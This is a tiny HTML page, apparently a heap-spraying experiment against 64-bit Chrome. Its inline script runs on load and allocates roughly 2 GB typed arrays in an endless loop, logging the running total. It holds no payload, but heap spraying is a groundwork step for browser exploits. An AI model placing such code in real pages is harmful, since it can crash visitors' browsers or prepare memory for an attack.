<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Heap spraying of 64-bit Chrome</title>
    <script>
        const size = 0x7FFFFFFF;
        for (let i = 1; i > 0; i++) {
            new Uint8Array(size);
            console.log("Totally allocated 0x" + (i * (size + 0xc001 + 0x4000)).toString(16) + " bytes. Loop: " + i);
        }
    </script>
</head>
<body>Heap spraying</body>
</html>
